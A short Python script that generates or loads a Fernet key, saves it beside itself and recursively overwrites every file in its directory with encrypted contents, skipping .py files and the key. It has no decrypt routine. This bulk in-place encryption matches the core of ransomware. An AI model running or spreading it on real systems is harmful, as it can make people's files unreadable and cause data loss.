from cryptography.fernet import Fernet
import os

def generate_key():
    # Generate a new encryption key
    return Fernet.generate_key()

def load_key(key_file):
    # Load the encryption key from a file
    f = open(key_file, "rb")
    key = f.read()
    f.close()
    return key

def save_key(key_file, key):
    # Save the encryption key to a file
    f = open(key_file, "wb")
    f.write(key)
    f.close()

def encrypt_file(file_path, key):
    # Encrypt a single file
    f = open(file_path, "rb")
    data = f.read()
    f.close()

    cipher = Fernet(key)
    encrypted = cipher.encrypt(data)

    f = open(file_path, "wb")
    f.write(encrypted)
    f.close()

def encrypt_directory(dir_path, key):
    # Encrypt all files in a directory
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            path = os.path.join(root, file)

            # Skip Python scripts and the key file
            if file.endswith(".py") or file == "encryption_key.key":
                continue

            encrypt_file(path, key)
            print("Encrypted:", file)

def main():
    # Main function to handle the encryption process
    cur_dir = os.path.dirname(os.path.realpath(__file__))
    key_path = os.path.join(cur_dir, "encryption_key.key")

    if not os.path.exists(key_path):
        # Generate and save key if it doesn't exist
        key = generate_key()
        save_key(key_path, key)
        print("Key made and saved:", key)
    else:
        # Load the existing key
        key = load_key(key_path)
        print("Key loaded:", key)

    # Encrypt files in the current directory
    encrypt_directory(cur_dir, key)

if __name__ == "__main__":
    main()
